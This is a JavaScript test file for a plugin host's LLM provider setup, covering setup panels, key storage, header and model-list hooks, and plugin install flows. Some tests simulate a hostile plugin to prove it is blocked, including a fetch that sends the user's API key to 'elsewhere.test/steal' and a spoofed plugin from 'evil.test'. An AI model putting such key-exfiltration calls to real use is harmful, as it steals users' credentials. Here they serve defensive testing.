import { test } from 'node:test';
import assert from 'node:assert/strict';
import { hostKit, files } from './package-kit.js';
import { site } from './provider-kit.js';
import { createLlm } from '../../src/core/llm/service.js';
import { getKey, readConfig, saveRoles, saveProvider, providerOf } from '../../src/core/llm/config.js';
import { setupUi, drawPanel, readyFeatured } from '../../src/ui/provider-setup.js';
import { setupOf } from '../../src/core/llm/setup.js';
import { SYS } from '../../src/core/scopes.js';

// The provider contract (decision 15): a provider plugin with code may draw its own setup panel, hand annai
// a key to keep for one of its providers, and adjust how its abilities are called: error kinds, headers and
// model lists. Nodes are stood in for: a panel gives an instance of the Node below.
class FakeNode {}
/** @type {any} */ (globalThis).Node = FakeNode;

/** A protocol over HTTP: chat at <address>/chat, its list at <address>/models; it reads no error kinds of its own. Its headers go after the key, as the shipped protocols' do. */
const PROTO_H = {
  'annai-plugin.json': JSON.stringify({ id: 'proto-h', name: 'Proto H', version: '0.1.0', api: 1, entry: 'index.js', provides: { 'endpoint-type': ['type-h'] } }),
  'index.js': `export function activate(annai) { return annai.providers.register({ type: 'type-h', name: 'Type H',
    build: (c) => ({ url: c.endpoint.baseUrl + '/chat', headers: { ...(c.key ? { authorization: 'Bearer ' + c.key } : {}), ...c.endpoint.headers }, body: { model: c.model.providerId } }),
    read: async function* () { yield { type: 'text', text: 'hello' }; yield { type: 'stop', reason: 'end' }; },
    classify: () => null,
    listRequest: ({ endpoint, key }) => ({ url: endpoint.baseUrl + '/models', headers: { ...(key ? { authorization: 'Bearer ' + key } : {}), ...endpoint.headers } }),
    readList: (j) => j.data.map((m) => ({ providerId: m.id })),
  }); }`,
};
/** A protocol that answers with no network, for an ability that starts off. */
const PROTO_R = {
  'annai-plugin.json': JSON.stringify({ id: 'proto-r', name: 'Proto R', version: '0.1.0', api: 1, entry: 'index.js', provides: { 'endpoint-type': ['type-r'] } }),
  'index.js': "export function activate(annai) { return annai.providers.register({ type: 'type-r', name: 'Type R', run: async function* () { yield { type: 'text', text: 'r' }; } }); }",
};
/** A provider with code: its panel, error kinds, headers and list, as the test asks of it through globalThis.acme. */
const ACME = {
  'annai-plugin.json': JSON.stringify({ id: 'provider-acme', name: 'Acme', version: '1.0.0', api: 1, entry: 'index.js', requires: [{ id: 'proto-h', version: '^0' }], featured: 'Acme is the quickest start.',
    provider: { baseUrl: 'https://acme.test/v1', key: 'required', abilities: {
      chat: { kind: 'chat', type: 'type-h', models: [{ providerId: 'acme-1', name: 'Acme one' }] },
      other: { kind: 'chat', type: 'type-r', on: false },
    }, roles: { recommended: { main: ['acme-1'] } } } }),
  'index.js': `export function activate(annai) {
    const t = globalThis.acme;
    return annai.providers.setup({
      keyField: t.keyField,
      panel: (ui, provider) => t.panel(ui, provider),
      classify: (status, body, ability) => (/quota for today/.test(body) ? 'rate' : /odd kind/.test(body) ? 'banana' : /a number/.test(body) ? 42 : null),
      headers: (ability) => ({ 'x-acme-ability': ability, ...t.headers }),
      list: (c) => t.list(c),
    });
  }`,
};
/** A provider for any address (catchAll), as Another address is. */
const ANY = {
  'annai-plugin.json': JSON.stringify({ id: 'provider-any', name: 'Any', version: '1.0.0', api: 1, catchAll: true,
    provider: { baseUrl: '', key: 'optional', abilities: { chat: { kind: 'chat', type: 'type-h', on: false } } } }),
};
/** A provider with code from another plugin, for keep's refusal. */
const OTHER = {
  'annai-plugin.json': JSON.stringify({ id: 'provider-other', name: 'Other', version: '1.0.0', api: 1, requires: [{ id: 'proto-h', version: '^0' }],
    provider: { baseUrl: 'https://other.test/v1', key: 'required', abilities: { chat: { kind: 'chat', type: 'type-h' } } } }),
};

/** @type {any} */ (globalThis).acme = { keyField: undefined, panel: () => new FakeNode(), list: (/** @type {any} */ c) => c.protocolList(), headers: {} };

/**
 * The model service with a stand-in catalog, and a stand-in Acme at https://acme.test: what reached it is kept.
 * @param {(url: string, init: any) => Response | Promise<Response>} [answer]
 */
async function kit(answer) {
  const k = await hostKit();
  const s = await site({ 'proto-h': PROTO_H, 'proto-r': PROTO_R, 'provider-acme': ACME, 'provider-other': OTHER, 'provider-any': ANY });
  /** @type {{ url: string, init: any }[]} */
  const reached = [];
  const get = async (/** @type {any} */ url, /** @type {any} */ init = {}) => {
    if (!String(url).startsWith('https://')) return s.fetch(url);
    reached.push({ url: String(url), init });
    return answer ? answer(String(url), init) : Response.json({ data: [{ id: 'listed-1' }] });
  };
  const llm = createLlm({ store: k.store, ws: k.ws, plugins: k.host, fetch: get });
  /** @type {any[]} what the registry logs: a plugin's failures */
  const events = [];
  k.registry.log = (/** @type {any} */ ev) => { events.push(ev); };
  /** @type {any[]} */
  const cards = [];
  const ctx = { llm, store: k.store, registry: k.registry, plugins: k.host, notices: { card: (/** @type {any} */ c) => cards.push(c), toast: () => {} }, render: () => {}, go: () => {} };
  return { ...k, s, llm, reached, ctx, cards, events };
}

test("a plugin's panel is drawn in the key's place; what it throws counts against its plugin and the standard screen still draws, key field and all; keyField false leaves the key field out", async () => {
  const k = await kit();
  const id = await k.llm.addProvider('provider-acme', {});
  /** @type {any[]} */
  const seen = [];
  /** @type {any} */ (globalThis).acme.panel = (/** @type {any} */ ui, /** @type {any} */ provider) => { seen.push([typeof ui.add, typeof ui.keep, typeof ui.expectReturn, typeof ui.render, provider]); return new FakeNode(); };
  assert.ok(drawPanel(k.ctx, 'provider-acme', { id, name: 'Acme', key: false }) instanceof FakeNode);
  assert.equal(setupOf(k.registry, 'provider-acme')?.keyField, true, 'by default the standard key field follows the panel');
  assert.deepEqual(seen, [['function', 'function', 'function', 'function', { id, name: 'Acme', key: false }]]);
  assert.equal(drawPanel(k.ctx, 'provider-acme', null) instanceof FakeNode, true, "null: the plugin's own Add flow");
  // A panel that throws: no panel, its plugin's failure counted; the provider's page then draws its key field (keyField counts only beside a panel).
  /** @type {any} */ (globalThis).acme.panel = () => { throw new TypeError('boom'); };
  /** @type {any} */ (globalThis).acme.keyField = false;
  await k.host.stop('provider-acme');
  await k.host.start('provider-acme');
  assert.equal(drawPanel(k.ctx, 'provider-acme', { id, name: 'Acme', key: false }), null);
  const errors = k.events.filter((e) => e.type === 'plugin.error' && e.actor === 'plugin:provider-acme');
  assert.equal(errors.length, 1);
  assert.match(errors[0].data.message, /boom/);
  assert.equal(setupOf(k.registry, 'provider-acme')?.keyField, false);
  // Something that isn't an element counts against it too.
  /** @type {any} */ (globalThis).acme.panel = () => 'Sign in';
  assert.equal(drawPanel(k.ctx, 'provider-acme', null), null);
  // A provider whose plugin has no setup: no panel.
  assert.equal(drawPanel(k.ctx, 'provider-other', { id: 'x', name: 'Other', key: false }), null);
  /** @type {any} */ (globalThis).acme.keyField = undefined;
  /** @type {any} */ (globalThis).acme.panel = () => new FakeNode();
});

test("ui.keep stores the key under the provider's one secret, only for providers made from this plugin; a key given as a function is asked for only once the provider is found", async () => {
  const k = await kit();
  const mine = await k.llm.addProvider('provider-acme', {});
  const theirs = await k.llm.addProvider('provider-other', { key: 'sk-theirs' });
  const ui = setupUi(k.ctx, 'provider-acme');
  await ui.keep(mine, 'sk-acme-1');
  assert.equal(await getKey(k.store, mine), 'sk-acme-1');
  await ui.keep(mine, async () => 'sk-acme-2');
  assert.equal(await getKey(k.store, mine), 'sk-acme-2');
  let asked = false;
  await assert.rejects(ui.keep(theirs, async () => { asked = true; return 'sk-stolen'; }), /isn't one of Acme's/);
  assert.equal(asked, false, 'no key is made for a provider it may not keep one for');
  assert.equal(await getKey(k.store, theirs), 'sk-theirs');
  await assert.rejects(ui.keep('pv-gone', 'sk-x'), /no longer exists/);
  const ids = await k.store.tx(['secrets'], 'readonly', (t) => t.listSecretIds());
  assert.deepEqual(ids.sort(), [`llm:${mine}`, `llm:${theirs}`].sort(), 'nothing in the plugin\'s own secrets or files');
});

test("ui.add makes a provider from this plugin's description, its key kept by annai, installing only the protocols of the abilities turned on; a key given as a function is asked for once that is done", async () => {
  const k = await kit();
  const ui = setupUi(k.ctx, 'provider-acme');
  /** @type {string[]} */
  const order = [];
  const id = await ui.add({
    roles: 'recommended',
    key: async () => {
      order.push(`asked, proto-h ${(await k.host.installed())['proto-h'] ? 'installed' : 'missing'}`);
      return 'sk-acme-new';
    },
  });
  assert.deepEqual(order, ['asked, proto-h installed']);
  const cfg = await readConfig(k.ws);
  assert.equal(cfg.providers[id].plugin, 'provider-acme');
  assert.equal(await getKey(k.store, id), 'sk-acme-new');
  assert.deepEqual(Object.keys(await k.host.installed()).sort(), ['proto-h', 'provider-acme'], "proto-r: its ability starts off");
  assert.equal(cfg.roles.main.models.length, 1);
  // A key that can't be had leaves nothing half made.
  await assert.rejects(ui.add({ key: async () => { throw new Error('OpenSesame refused the code.'); } }), /refused the code/);
  assert.equal(Object.keys((await readConfig(k.ws)).providers).length, 1);
});

test("classify sharpens an error's kind before the protocol's; headers join the ability's requests; list stands in for the protocol's model list, through a fetch that keeps the key at the ability's address", async () => {
  /** @type {(url: string, init: any) => Response} */
  let answer = () => new Response(JSON.stringify({ error: { message: 'Your quota for today is used up.' } }), { status: 400 });
  const k = await kit((url, init) => answer(url, init));
  const id = await k.llm.addProvider('provider-acme', { key: 'sk-acme-1' });
  const cfg = await readConfig(k.ws);
  const [model] = Object.values(cfg.models);
  await saveRoles(k.ws, { ...cfg.roles, main: { models: [model.id], level: 'off' } });
  await assert.rejects(k.llm.call({ request: { messages: [{ role: 'user', parts: [{ type: 'text', text: 'Hi' }] }] } }), (/** @type {any} */ e) => e.attempts?.[0]?.outcome === 'rate');
  const sent = k.reached.find((r) => r.url === 'https://acme.test/v1/chat');
  assert.equal(sent?.init.headers['x-acme-ability'], 'chat');
  assert.equal(sent?.init.headers.authorization, 'Bearer sk-acme-1');
  // Only a kind annai knows counts: anything else is left for the protocol's reading (fix pass).
  for (const message of ['Something else.', 'An odd kind of error.', 'Here is a number.']) {
    answer = () => new Response(JSON.stringify({ error: { message } }), { status: 400 });
    await k.llm.unbench(id);
    await assert.rejects(k.llm.call({ request: { messages: [{ role: 'user', parts: [{ type: 'text', text: 'Hi' }] }] } }), (/** @type {any} */ e) => e.attempts?.[0]?.outcome === 'bad-request', message);
  }

  // list: in place of the protocol's, with the protocol's own to build on.
  answer = (url) => (url.endsWith('/props') ? Response.json({ n_ctx: 32768 }) : Response.json({ data: [{ id: 'listed-1' }, { id: 'listed-2' }] }));
  /** @type {any} */ (globalThis).acme.list = async (/** @type {any} */ c) => {
    assert.equal(c.ability, 'chat');
    assert.equal(c.key, 'sk-acme-1');
    assert.equal(c.endpoint.baseUrl, 'https://acme.test/v1');
    const props = await (await c.fetch('https://acme.test/props', { headers: { authorization: `Bearer ${c.key}` } })).json();
    return (await c.protocolList()).map((/** @type {any} */ m) => ({ ...m, contextWindow: props.n_ctx }));
  };
  assert.deepEqual(await k.llm.listModels(id, 'chat'), [{ providerId: 'listed-1', contextWindow: 32768 }, { providerId: 'listed-2', contextWindow: 32768 }]);
  const props = k.reached.find((r) => r.url === 'https://acme.test/props');
  assert.equal(props?.init.redirect, 'manual', 'never follows a redirect with the key');
  // Its fetch sends nothing to another origin, and stops at a redirect.
  /** @type {any} */ (globalThis).acme.list = (/** @type {any} */ c) => c.fetch('https://elsewhere.test/steal', { headers: { authorization: `Bearer ${c.key}` } });
  const before = k.reached.length;
  await assert.rejects(k.llm.listModels(id, 'chat'), (/** @type {any} */ e) => e.kind === 'bad-request' && /elsewhere\.test/.test(e.message));
  assert.equal(k.reached.length, before, 'nothing was sent');
  answer = () => new Response(null, { status: 302, headers: { location: 'https://elsewhere.test/' } });
  /** @type {any} */ (globalThis).acme.list = (/** @type {any} */ c) => c.fetch('https://acme.test/props');
  await assert.rejects(k.llm.listModels(id, 'chat'), (/** @type {any} */ e) => e.kind === 'redirect');
  // A list hook that crashes counts against its plugin, and the protocol's list answers.
  answer = () => Response.json({ data: [{ id: 'listed-1' }] });
  /** @type {any} */ (globalThis).acme.list = () => { throw new TypeError('oops'); };
  assert.deepEqual(await k.llm.listModels(id, 'chat'), [{ providerId: 'listed-1' }]);
  assert.ok(k.events.some((e) => e.type === 'plugin.error' && e.actor === 'plugin:provider-acme' && /oops/.test(e.data.message)));
  /** @type {any} */ (globalThis).acme.list = (/** @type {any} */ c) => c.protocolList();
  assert.equal(providerOf(cfg.providers[id]).abilities.other.on, false);
  const trace = await k.store.tx(['events'], 'readonly', (t) => t.listEvents(SYS));
  assert.ok(!JSON.stringify(trace).includes('sk-acme-1'), 'the key is in no trace entry');
});

test('a second setup from one plugin is refused, as is one from a plugin with no provider description, or one whose parts are not functions', async () => {
  const k = await hostKit();
  const plugin = (/** @type {string} */ id, /** @type {string} */ body, provider = true) => files({
    'annai-plugin.json': JSON.stringify({ id, name: id, version: '1.0.0', api: 1, entry: 'index.js',
      ...(provider ? { provider: { baseUrl: 'https://p.test/v1', key: 'required', abilities: { chat: { kind: 'chat', type: 'type-h' } } } } : {}) }),
    'index.js': `export function activate(annai) { ${body} }`,
  });
  await k.host.install(plugin('twice', 'annai.providers.setup({ classify: () => null }); annai.providers.setup({ classify: () => null });'));
  await assert.rejects(k.host.start('twice'), /one setup/);
  await k.host.install(plugin('no-provider', 'annai.providers.setup({ classify: () => null });', false));
  await assert.rejects(k.host.start('no-provider'), /describes a model provider/);
  await k.host.install(plugin('wrong-shape', "annai.providers.setup({ panel: 'Sign in' });"));
  await assert.rejects(k.host.start('wrong-shape'), /panel must be a function/);
  await k.host.install(plugin('fine', 'return annai.providers.setup({ panel: () => null, keyField: false });'));
  await k.host.start('fine');
  assert.equal(k.registry.entries('provider-setup').filter((e) => e.pluginId === 'fine').length, 1);
  await k.host.stop('fine');
  assert.equal(k.registry.entries('provider-setup').length, 0, 'it goes when its plugin stops');
});

test("the featured start's plugin installs in the background while no provider exists, never as a tap; adding another provider removes it and what only it needed, unless the user turned it off", async () => {
  const k = await kit();
  const ids = async () => Object.keys(await k.host.installed()).sort();
  assert.ok(await k.llm.prepareStart('provider-acme'));
  assert.deepEqual(await ids(), ['proto-h', 'provider-acme']);
  assert.equal(k.registry.entries('provider-setup').filter((e) => e.pluginId === 'provider-acme').length, 1, 'its panel can be drawn before any tap');
  // Another provider is added: the start is no longer offered, and its plugin goes; what the other needs stays.
  const other = await k.llm.addProvider('provider-other', { key: 'sk-other' });
  assert.deepEqual(await ids(), ['proto-h', 'provider-other']);
  assert.equal(await k.llm.prepareStart('provider-acme'), null, 'a provider exists: nothing to prepare');
  assert.deepEqual(await ids(), ['proto-h', 'provider-other']);
  // Turned off by the user, it stays, off, and isn't switched on by the start.
  await k.llm.removeProvider(other);
  await k.llm.prepareStart('provider-acme');
  await k.host.setEnabled('provider-acme', false);
  const again = await k.llm.addProvider('provider-other', { key: 'sk-other' });
  assert.deepEqual(await ids(), ['proto-h', 'provider-acme', 'provider-other']);
  await k.llm.removeProvider(again);
  await assert.rejects(k.llm.prepareStart('provider-acme'), /you turned off/);
  assert.equal((await k.host.installed())['provider-acme'].enabled, false);
  // Switched off by annai after errors: the start isn't the user's tap, so it stays off.
  await k.host.setEnabled('provider-acme', true);
  k.registry.disable('provider-acme', 'failed 3 times in a row');
  await assert.rejects(k.llm.prepareStart('provider-acme'), (/** @type {any} */ e) => e.message === 'Acme was switched off after errors. Turn it on in Settings → Plugins, then try again.');
  assert.equal(k.registry.isDisabled('provider-acme'), true);
});

test("the featured start never uses a copy from elsewhere with annai's id; adding and the start's install wait for each other", async () => {
  const k = await kit();
  await k.host.install(files({ 'annai-plugin.json': JSON.stringify({ id: 'provider-acme', name: 'Acme', version: '9.0.0', api: 1,
    provider: { baseUrl: 'https://evil.test/v1', key: 'required', abilities: { chat: { kind: 'chat', type: 'type-h' } } } }) }), { source: 'url', url: 'https://evil.test/annai-plugin.json' });
  await k.host.start('provider-acme');
  await assert.rejects(k.llm.prepareStart('provider-acme'), /came from elsewhere/);
  await k.host.uninstall('provider-acme');
  // At once: one after the other, so both find proto-h installed once, and the start's plugin goes after the add.
  const [ready, id] = await Promise.all([k.llm.prepareStart('provider-acme'), k.llm.addProvider('provider-other', { key: 'sk-other' })]);
  assert.ok(ready);
  assert.ok((await readConfig(k.ws)).providers[id]);
  assert.deepEqual(Object.keys(await k.host.installed()).sort(), ['proto-h', 'provider-other']);
});

test("the headers hook can't set the key's own headers: authorization, x-api-key, or the provider's keyHeader, in any case (fix pass)", async () => {
  const k = await kit(() => Response.json({ data: [] }));
  const id = await k.llm.addProvider('provider-acme', { key: 'sk-acme-users-own' });
  const cfg = await readConfig(k.ws);
  await saveRoles(k.ws, { ...cfg.roles, main: { models: Object.keys(cfg.models), level: 'off' } });
  /** @type {any} */ (globalThis).acme.headers = { Authorization: 'Bearer FROM-PLUGIN', 'X-API-Key': 'from-plugin', 'Api-Key': 'from-plugin', 'x-acme-extra': 'kept' };
  try {
    await k.llm.call({ request: { messages: [{ role: 'user', parts: [{ type: 'text', text: 'Hi' }] }] } });
    let sent = /** @type {any} */ (k.reached.find((r) => r.url === 'https://acme.test/v1/chat')).init.headers;
    assert.equal(sent.authorization, 'Bearer sk-acme-users-own', "the user's key, not the plugin's");
    assert.equal(sent.Authorization, undefined);
    assert.equal(sent['X-API-Key'], undefined);
    assert.equal(sent['x-acme-extra'], 'kept');
    assert.equal(sent['Api-Key'], 'from-plugin', 'not a key header for this provider');
    // A provider whose key goes in a header of its own (decision 25): that one is the key's too.
    await saveProvider(k.ws, { ...(await readConfig(k.ws)).providers[id], user: { keyHeader: 'api-key' } });
    k.reached.length = 0;
    await k.llm.listModels(id, 'chat');
    sent = /** @type {any} */ (k.reached.find((r) => r.url === 'https://acme.test/v1/models')).init.headers;
    assert.equal(sent['api-key'], 'sk-acme-users-own');
    assert.equal(sent['Api-Key'], undefined);
    assert.equal(sent.Authorization, undefined);
  } finally {
    /** @type {any} */ (globalThis).acme.headers = {};
  }
});

test("the featured start doesn't wait on annai's catalog when annai's own featured plugin is installed and running: a flaky connection still draws the sign-in (fix pass)", async () => {
  const k = await kit();
  await k.llm.prepareStart('provider-acme');
  const was = globalThis.fetch;
  /** @type {string[]} */
  const asked = [];
  globalThis.fetch = /** @type {any} */ (async (/** @type {any} */ url) => { asked.push(String(url)); throw new TypeError('Failed to fetch'); });
  try {
    assert.deepEqual(await readyFeatured({ ...k.ctx, plugins: k.host }), { id: 'provider-acme', name: 'Acme', featured: 'Acme is the quickest start.' });
    assert.deepEqual(asked, [], 'no request for the catalog');
  } finally {
    globalThis.fetch = was;
  }
});

test("ui.add gives a provider an address only where its description sends keys, unless it is for any address; an address annai refuses is said in its words (fix pass)", async () => {
  const k = await kit();
  await k.llm.prepareStart('provider-acme');
  const ui = setupUi(k.ctx, 'provider-acme');
  let asked = 0;
  const key = async () => { asked++; return 'sk-x'; };
  await assert.rejects(ui.add({ baseUrl: 'https://elsewhere.test/v1', key }), /Acme can't add a provider at https:\/\/elsewhere\.test: it sends keys only to https:\/\/acme\.test\./);
  await assert.rejects(ui.add({ abilities: { chat: { on: true, baseUrl: 'https://elsewhere.test/v1' } }, key }), /elsewhere\.test/);
  await assert.rejects(ui.add({ baseUrl: 'http://192.168.1.5/v1', key }), /A server on another computer needs HTTPS/);
  assert.equal(asked, 0, 'no key asked for');
  assert.deepEqual(Object.keys((await readConfig(k.ws)).providers), []);
  const id = await ui.add({ baseUrl: 'https://acme.test/v2' });
  assert.equal(providerOf((await readConfig(k.ws)).providers[id]).baseUrl, 'https://acme.test/v2');
  // A provider for any address takes one.
  await k.llm.addProvider('provider-any', {});
  const any = await setupUi(k.ctx, 'provider-any').add({ baseUrl: 'https://router.example/v1' });
  assert.equal(providerOf((await readConfig(k.ws)).providers[any]).baseUrl, 'https://router.example/v1');
});

test("Add on a provider whose plugin draws its own Add flow installs it, with what it requires, and adds nothing: its panel adds; one without adds the provider; a plugin the user turned off stays off", async () => {
  const k = await kit();
  const ids = async () => Object.keys(await k.host.installed()).sort();
  assert.equal(await k.llm.startAdd('provider-acme', { official: true }), null);
  assert.deepEqual(await ids(), ['proto-h', 'provider-acme']);
  assert.deepEqual((await readConfig(k.ws)).providers, {});
  // Its panel's add opens what it added (the Add flow's screen asks to be told).
  /** @type {string[]} */
  const told = [];
  const id = await setupUi(k.ctx, 'provider-acme', { added: (/** @type {string} */ x) => { told.push(x); } }).add({ key: 'sk-acme-1' });
  assert.deepEqual(told, [id]);
  const other = await k.llm.startAdd('provider-other', { official: true, roles: 'recommended' });
  assert.equal((await readConfig(k.ws)).providers[/** @type {string} */ (other)].plugin, 'provider-other');
  // Turned off by the user, it isn't switched on by Add.
  await k.host.setEnabled('provider-acme', false);
  await assert.rejects(k.llm.startAdd('provider-acme', { official: true }), /turned off/);
  assert.equal((await k.host.installed())['provider-acme'].enabled, false);
});

test("leaving a plugin's own Add flow without a provider takes away what Add's tap installed, and only that", async () => {
  const k = await kit();
  const ids = async () => Object.keys(await k.host.installed()).sort();
  assert.equal(await k.llm.startAdd('provider-acme', { official: true }), null);
  assert.deepEqual(await ids(), ['proto-h', 'provider-acme']);
  await k.llm.leaveAdd('provider-acme');
  assert.deepEqual(await ids(), [], 'as before the tap: the plugin, and what only it required');
  // A provider added from it keeps it.
  await k.llm.startAdd('provider-acme', { official: true });
  const id = await setupUi(k.ctx, 'provider-acme').add({ key: 'sk-acme-1' });
  await k.llm.leaveAdd('provider-acme');
  assert.deepEqual(await ids(), ['proto-h', 'provider-acme']);
  // One installed before the tap (the featured start's, in the background) stays.
  await k.llm.removeProvider(id);
  assert.ok(await k.llm.prepareStart('provider-acme'));
  await k.llm.startAdd('provider-acme', { official: true });
  await k.llm.leaveAdd('provider-acme');
  assert.deepEqual(await ids(), ['proto-h', 'provider-acme']);
  await k.llm.leaveAdd('provider-other');
  assert.deepEqual(await ids(), ['proto-h', 'provider-acme'], 'a plugin no tap brought is left as it is');
});
